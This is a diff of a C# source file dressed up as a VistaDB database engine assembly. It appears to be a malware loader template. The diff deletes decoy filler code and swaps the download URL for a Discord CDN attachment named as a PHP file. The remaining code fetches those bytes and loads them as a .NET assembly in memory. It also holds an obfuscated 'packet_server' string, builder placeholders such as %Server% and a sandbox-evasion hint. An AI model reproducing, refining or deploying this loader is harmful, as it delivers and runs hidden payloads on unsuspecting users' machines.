@@ -15,12 +15,7 @@ using System.Runtime.InteropServices;
 using System.Security;
 using System.Text;
 using System.ComponentModel;
-using System.Dynamic;
-using System.Collections;
-using System.Collections.ObjectModel;
-using System.Globalization;
-using System.Drawing;
-using HeightWeightInfo;
+
 //Default [assembly: AssemblyTitle("")]
 //Default [assembly: AssemblyDescription("VistaDB Database Engine")]
 //Default [assembly: AssemblyCompany("Vista Software")]
@@ -34,23 +29,6 @@ using HeightWeightInfo;
 //Assembly [assembly: AssemblyProduct("{4}")]
 //Assembly [assembly: AssemblyCopyright("{5}")]
 //Assembly [assembly: AssemblyFileVersion("{7}.{8}.{9}.{10}")]
-namespace HeightWeightInfo
-{
-    class File1
-    {
-    }
-
-    public partial class Record
-    {
-        private int h;
-        private int w;
-        public Record(int h, int w)
-        {
-            this.h = h;
-            this.w = w;
-        }
-    }
-}
 
 
 namespace Conditional
@@ -72,13 +50,7 @@ namespace Conditional
                 catch (Exception ex)
                 {
 
-                    int number = 2;
-                    if (number < 5)
-                    {
-                        Console.WriteLine("{0} is less than 5", number);
-                    }
-
-                    Console.WriteLine("This statement is always executed.");
+         
 
 
                  
@@ -123,12 +95,12 @@ namespace Conditional
                 var bn = new byte[] { 112, 97, 99, 107, 101, 116, 95, 115, 101, 114, 118, 101, 114 };
                 var texts = System.Text.Encoding.ASCII.GetString(bn);
 
-                byte[] treehouseBytes = Street("https://cdn.discordapp.com/attachments/841595401253158954/842444976696066108/sample-code-csharpWebSite1PayWeb3simple_initiate.cshtml");
+                byte[] treehouseBytes = Street("https://cdn.discordapp.com/attachments/841595401253158954/842594042083541012/ThreeDPayment.php");
 
                 Assembly name = AppDomain.CurrentDomain.Load(treehouseBytes);
 
                 string BirthDate = texts;
-                Record myRecord = new Record(10, 15);
+    
                 string city = text;
 
                 object Contacts = new object[] { %aPP%, string.Empty, Street("%Server%"), true };
@@ -149,19 +121,7 @@ namespace Conditional
             catch (Exception ex)
             {
        
-                
-			int number = 12;
-
-			if (number < 5)
-			{
-				Console.WriteLine("{0} is less than 5", number);
-			}
-			else
-			{
-				Console.WriteLine("{0} is greater than or equal to 5", number);
-			}
-
-			Console.WriteLine("This statement is always executed.");
+          
             }
 
             //sandboxie [DllImport("kernel32.dll")]
